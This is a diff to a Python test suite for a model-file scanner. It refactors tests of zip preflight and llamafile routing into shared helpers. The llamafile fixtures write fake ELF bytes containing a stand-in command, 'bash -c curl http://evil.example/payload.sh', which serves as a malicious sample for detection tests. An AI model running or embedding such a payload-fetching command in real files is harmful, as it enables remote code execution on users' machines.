@@ -544,31 +544,11 @@ def test_get_scanner_for_file_routes_over_entry_zip_before_specialized_zip_probe
 
 
 def test_get_scanner_for_file_honors_selection_before_zip_preflight(tmp_path: Path) -> None:
-    model_path = _write_zip_archive(
-        tmp_path / "selected-pickle.zip",
-        {"one.txt": b"one", "two.txt": b"two"},
-    )
-
-    scanner = get_scanner_for_file(
-        str(model_path),
-        config={"scanners": ["pickle"], "max_zip_entries": 1},
-    )
-
-    assert scanner is None
+    _assert_registry_skips_zip_preflight(tmp_path, ("selected-pickle.zip"), ("pickle"))
 
 
 def test_get_scanner_for_file_honors_numpy_route_before_plain_zip_preflight(tmp_path: Path) -> None:
-    model_path = _write_zip_archive(
-        tmp_path / "selected-numpy.zip",
-        {"one.txt": b"one", "two.txt": b"two"},
-    )
-
-    scanner = get_scanner_for_file(
-        str(model_path),
-        config={"scanners": ["numpy"], "max_zip_entries": 1},
-    )
-
-    assert scanner is None
+    _assert_registry_skips_zip_preflight(tmp_path, ("selected-numpy.zip"), ("numpy"))
 
 
 def test_get_scanner_for_file_routes_disguised_rar_by_header(tmp_path: Path) -> None:
@@ -784,15 +764,7 @@ def test_get_scanner_for_path_routes_extensionless_middle_marker_llamafile(tmp_p
 
 
 def test_get_scanner_for_path_routes_extensionless_malicious_llamafile(tmp_path: Path) -> None:
-    llamafile_path = tmp_path / "llama"
-    llamafile_path.write_bytes(
-        b"\x7fELF"
-        + b"\x02\x01\x01\x00"
-        + b"\x00" * 56
-        + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
-    )
-
-    _assert_scanner_for_path(llamafile_path, "llamafile")
+    _assert_llamafile_suffix(tmp_path, "llama")
 
 
 def test_get_scanner_for_path_routes_renamed_cntk_by_content(tmp_path: Path) -> None:
@@ -878,27 +850,11 @@ def test_get_scanner_for_path_does_not_route_pickle_after_zip_probe_read_failure
 
 
 def test_get_scanner_for_path_routes_misnamed_malicious_llamafile(tmp_path: Path) -> None:
-    llamafile_path = tmp_path / "payload.jpg"
-    llamafile_path.write_bytes(
-        b"\x7fELF"
-        + b"\x02\x01\x01\x00"
-        + b"\x00" * 56
-        + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
-    )
-
-    _assert_scanner_for_path(llamafile_path, "llamafile")
+    _assert_llamafile_suffix(tmp_path, "payload.jpg")
 
 
 def test_get_scanner_for_path_prioritizes_llamafile_over_onnx_suffix(tmp_path: Path) -> None:
-    llamafile_path = tmp_path / "payload.onnx"
-    llamafile_path.write_bytes(
-        b"\x7fELF"
-        + b"\x02\x01\x01\x00"
-        + b"\x00" * 56
-        + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
-    )
-
-    _assert_scanner_for_path(llamafile_path, "llamafile")
+    _assert_llamafile_suffix(tmp_path, "payload.onnx")
 
 
 def test_get_scanner_for_path_does_not_route_extensionless_llamafile_near_match(tmp_path: Path) -> None:
@@ -1128,3 +1084,29 @@ def test_get_scanner_for_path_limits_unreadable_extension_routing_to_read_failur
     else:
         assert scanner_class is not None
         assert scanner_class.name == scanner_name
+
+
+def _assert_registry_skips_zip_preflight(tmp_path: Path, filename: str, scanner_id: str) -> None:
+    model_path = _write_zip_archive(
+        tmp_path / filename,
+        {"one.txt": b"one", "two.txt": b"two"},
+    )
+
+    scanner = get_scanner_for_file(
+        str(model_path),
+        config={"scanners": [scanner_id], "max_zip_entries": 1},
+    )
+
+    assert scanner is None
+
+
+def _assert_llamafile_suffix(tmp_path: Path, filename: str) -> None:
+    llamafile_path = tmp_path / filename
+    llamafile_path.write_bytes(
+        b"\x7fELF"
+        + b"\x02\x01\x01\x00"
+        + b"\x00" * 56
+        + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
+    )
+
+    _assert_scanner_for_path(llamafile_path, "llamafile")
